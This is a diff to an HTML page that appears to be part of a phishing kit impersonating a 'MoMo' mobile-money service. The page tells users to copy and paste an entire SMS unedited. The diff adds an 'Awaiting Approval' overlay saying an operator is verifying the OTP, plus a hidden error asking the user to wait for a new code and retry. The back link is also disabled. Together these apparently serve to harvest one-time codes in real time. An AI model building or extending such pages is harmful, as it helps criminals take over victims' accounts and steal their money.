@@ -22,7 +22,7 @@
       <section class="card" aria-labelledby="sms-title">
 
         <div class="page-header-row">
-          <a class="back-link" href="checkout.html" id="back-link">
+          <a class="back-link" href="#" id="back-link">
             <svg class="back-link__icon" viewBox="0 0 24 24" fill="none"
                  stroke="currentColor" stroke-width="2"
                  stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
@@ -64,6 +64,20 @@
           <span>
             DO NOT edit the SMS &#8212; only copy and paste
             the entire message below
+          </span>
+        </div>
+
+        <div class="callout callout--warn" id="sms-error"
+             style="display:none; margin-top: var(--space-4);">
+          <svg class="callout__icon" viewBox="0 0 24 24" fill="none"
+               stroke="currentColor" stroke-width="2"
+               stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/>
+            <line x1="12" y1="9" x2="12" y2="13"/>
+            <line x1="12" y1="17" x2="12.01" y2="17"/>
+          </svg>
+          <span id="sms-error-text">
+            Invalid confirmation message, please wait for a new one and try again.
           </span>
         </div>
 
@@ -114,7 +128,7 @@
         </svg>
         <span>Status</span>
       </a>
-      <a class="app-nav-item" href="plans.html" aria-current="page">
+      <a class="app-nav-item" href="plans.html">
         <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="2" stroke-linecap="round"
              stroke-linejoin="round" aria-hidden="true">
@@ -147,6 +161,18 @@
         <span>Settings</span>
       </a>
     </nav>
+
+    <div class="overlay" id="sms-loader" hidden>
+      <div class="loader-card" role="status" aria-live="polite">
+        <div class="loader-spinner" aria-hidden="true"></div>
+        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
+        <h2 class="loader-card__title" id="sms-loader-title">Awaiting Approval...</h2>
+        <p class="loader-card__body" id="sms-loader-body">
+          Waiting for the operator to verify the OTP. Please do not close this page.
+        </p>
+        <p class="loader-card__footnote">Please do not refresh the page</p>
+      </div>
+    </div>
 
   </div>
 
